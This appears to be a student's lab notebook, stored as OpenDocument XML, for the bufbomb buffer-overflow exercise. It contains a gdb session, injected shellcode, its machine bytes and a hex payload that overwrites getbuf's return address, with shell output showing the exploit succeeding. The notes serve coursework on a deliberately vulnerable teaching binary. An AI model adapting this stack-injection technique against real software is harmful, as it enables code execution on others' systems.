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02f7" officeooo:paragraph-rsid="000502f7"/>
    </style:style>
    <style:style style:name="P2" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="000502f7" officeooo:paragraph-rsid="000502f7"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Standard">
      <style:text-properties officeooo:rsid="0006a4f4" officeooo:paragraph-rsid="0006a4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nzhongyu@ubuntu:~$ cd Desktop/ </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop$ cd lab3/ </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ gdb bufbomb </text:p>
      <text:p text:style-name="P1">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1 </text:p>
      <text:p text:style-name="P1">Copyright (C) 2014 Free Software Foundation, Inc. </text:p>
      <text:p text:style-name="P1">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt; </text:p>
      <text:p text:style-name="P1">This is free software: you are free to change and redistribute it. </text:p>
      <text:p text:style-name="P1">There is NO WARRANTY, to the extent permitted by law. <text:s/>Type "show copying" </text:p>
      <text:p text:style-name="P1">and "show warranty" for details. </text:p>
      <text:p text:style-name="P1">This GDB was configured as "i686-linux-gnu". </text:p>
      <text:p text:style-name="P1">Type "show configuration" for configuration details. </text:p>
      <text:p text:style-name="P1">For bug reporting instructions, please see: </text:p>
      <text:p text:style-name="P1">&lt;http://www.gnu.org/software/gdb/bugs/&gt;. </text:p>
      <text:p text:style-name="P1">Find the GDB manual and other documentation resources online at: </text:p>
      <text:p text:style-name="P1">&lt;http://www.gnu.org/software/gdb/documentation/&gt;. </text:p>
      <text:p text:style-name="P1">For help, type "help". </text:p>
      <text:p text:style-name="P1">Type "apropos word" to search for commands related to "word"... </text:p>
      <text:p text:style-name="P1">Reading symbols from bufbomb...done. </text:p>
      <text:p text:style-name="P1">(gdb) b getbuf </text:p>
      <text:p text:style-name="P1">Breakpoint 1 at 0x8048caa </text:p>
      <text:p text:style-name="P1">(gdb) r -u 16307130194 </text:p>
      <text:p text:style-name="P1">Starting program: /home/chenzhongyu/Desktop/lab3/bufbomb -u 16307130194 </text:p>
      <text:p text:style-name="P1">Userid: 16307130194 </text:p>
      <text:p text:style-name="P1">Cookie: 0x759069aa </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Breakpoint 1, 0x08048caa in getbuf () </text:p>
      <text:p text:style-name="P1">(gdb) disas </text:p>
      <text:p text:style-name="P1">Dump of assembler code for function getbuf: </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca4 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca5 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca7 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x38,%esp </text:p>
      <text:p text:style-name="P1">=&gt; 0x08048caa &lt;+6&gt;:<text:tab/>lea <text:s text:c="3"/>-0x28(%ebp),%eax </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cad &lt;+9&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp) </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cb0 &lt;+12&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt; </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cb5 &lt;+17&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cba &lt;+22&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cbb &lt;+23&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P1">End of assembler dump. </text:p>
      <text:p text:style-name="P1">(gdb) nexti </text:p>
      <text:p text:style-name="P1">0x08048cad in getbuf () </text:p>
      <text:p text:style-name="P1">(gdb) disas </text:p>
      <text:p text:style-name="P1">Dump of assembler code for function getbuf: </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca4 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca5 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca7 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x38,%esp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048caa &lt;+6&gt;:<text:tab/>lea <text:s text:c="3"/>-0x28(%ebp),%eax </text:p>
      <text:p text:style-name="P1">=&gt; 0x08048cad &lt;+9&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp) </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cb0 &lt;+12&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt; </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cb5 &lt;+17&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/><text:s text:c="3"/>0x08048cba &lt;+22&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cbb &lt;+23&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P1">End of assembler dump. </text:p>
      <text:p text:style-name="P1">(gdb) x $eax </text:p>
      <text:p text:style-name="P1">0x55683378 &lt;_reserved+1037176&gt;:<text:tab/>0x00000000 </text:p>
      <text:p text:style-name="P1">(gdb) x $ebp </text:p>
      <text:p text:style-name="P1">0x556833a0 &lt;_reserved+1037216&gt;:<text:tab/>0x556833d0 </text:p>
      <text:p text:style-name="P1">(gdb) x $ebp+0x4 </text:p>
      <text:p text:style-name="P1">0x556833a4 &lt;_reserved+1037220&gt;:<text:tab/>0x08048d39 </text:p>
      <text:p text:style-name="P1">(gdb) x $ebp-0x28 </text:p>
      <text:p text:style-name="P1">0x55683378 &lt;_reserved+1037176&gt;:<text:tab/>0x00000000 </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">return address 0x55683378</text:p>
      <text:p text:style-name="P1">char[]</text:p>
      <text:p text:style-name="P1">movl $0x759069aa ,%eax</text:p>
      <text:p text:style-name="P1">movl $0x556833d0 ,%ebp</text:p>
      <text:p text:style-name="P1">push $0x08048d39 </text:p>
      <text:p text:style-name="P1">ret</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Dump of assembler code for function getbuf: </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca4 &lt;+0&gt;:<text:tab/>push <text:s text:c="2"/>%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca5 &lt;+1&gt;:<text:tab/>mov <text:s text:c="3"/>%esp,%ebp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048ca7 &lt;+3&gt;:<text:tab/>sub <text:s text:c="3"/>$0x38,%esp </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048caa &lt;+6&gt;:<text:tab/>lea <text:s text:c="3"/>-0x28(%ebp),%eax </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cad &lt;+9&gt;:<text:tab/>mov <text:s text:c="3"/>%eax,(%esp) </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cb0 &lt;+12&gt;:<text:tab/>call <text:s text:c="2"/>0x8048bf1 &lt;Gets&gt; </text:p>
      <text:p text:style-name="P1">=&gt; 0x08048cb5 &lt;+17&gt;:<text:tab/>mov <text:s text:c="3"/>$0x1,%eax </text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cba &lt;+22&gt;:<text:tab/>leave <text:s/></text:p>
      <text:p text:style-name="P1"><text:s text:c="3"/>0x08048cbb &lt;+23&gt;:<text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P1">End of assembler dump. </text:p>
      <text:p text:style-name="P1">(gdb) x $ebp </text:p>
      <text:p text:style-name="P1">0x556833a0 &lt;_reserved+1037216&gt;:<text:tab/>0x556833d0 </text:p>
      <text:p text:style-name="P1">(gdb) q </text:p>
      <text:p text:style-name="P1">A debugging session is active. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"><text:tab/>Inferior 1 [process 2924] will be killed. </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">Quit anyway? (y or n) y </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c source3.s </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d source3.o &gt; source3.d </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; level3.txt | ./bufbomb -u 16307130194 </text:p>
      <text:p text:style-name="P1">Userid: 16307130194 </text:p>
      <text:p text:style-name="P1">Cookie: 0x759069aa </text:p>
      <text:p text:style-name="P1">Type string:Ouch!: You caused a segmentation fault! </text:p>
      <text:p text:style-name="P1">Better luck next time </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ gcc -m32 -c source3.s </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ objdump -d source3.o &gt; source3.d </text:p>
      <text:p text:style-name="P1">chenzhongyu@ubuntu:~/Desktop/lab3$ ./hex2raw &lt; level3.txt | ./bufbomb -u 16307130194 </text:p>
      <text:p text:style-name="P1">Userid: 16307130194 </text:p>
      <text:p text:style-name="P1"><text:soft-page-break/>Cookie: 0x759069aa </text:p>
      <text:p text:style-name="P1">Type string:Boom!: getbuf returned 0x759069aa </text:p>
      <text:p text:style-name="P1">VALID </text:p>
      <text:p text:style-name="P1">NICE JOB! </text:p>
      <text:p text:style-name="P1"><text:a xlink:type="simple" xlink:href="mailto:chenzhongyu@ubuntu">chenzhongyu@ubuntu</text:a>:~/Desktop/lab3$</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P3">movl $0x759069aa,%eax</text:p>
      <text:p text:style-name="P3">movl $0x556833d0,%ebp</text:p>
      <text:p text:style-name="P3">push $0x08048d39</text:p>
      <text:p text:style-name="P3">ret</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">source3.o: <text:s text:c="4"/>file format elf32-i386</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Disassembly of section .text:</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">00000000 &lt;.text&gt;:</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>0:<text:tab/>b8 aa 69 90 75 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x759069aa,%eax</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>5:<text:tab/>bd d0 33 68 55 <text:s text:c="6"/><text:tab/>mov <text:s text:c="3"/>$0x556833d0,%ebp</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>a:<text:tab/>68 39 8d 04 08 <text:s text:c="6"/><text:tab/>push <text:s text:c="2"/>$0x8048d39</text:p>
      <text:p text:style-name="P3"><text:s text:c="3"/>f:<text:tab/>c3 <text:s text:c="18"/><text:tab/>ret <text:s text:c="3"/></text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">b8 aa 69 90 75</text:p>
      <text:p text:style-name="P3">bd d0 33 68 55</text:p>
      <text:p text:style-name="P3">68 39 8d 04 08</text:p>
      <text:p text:style-name="P3">c3</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">00 00 00 00</text:p>
      <text:p text:style-name="P3">78 33 68 5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23:53:50.150359391</meta:creation-date>
    <dc:date>2017-11-02T00:09:25.064674169</dc:date>
    <meta:editing-duration>P0D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3" meta:paragraph-count="121" meta:word-count="506" meta:character-count="3982" meta:non-whitespace-character-count="3280"/>
  </office:meta>
</office:document-meta>
</file>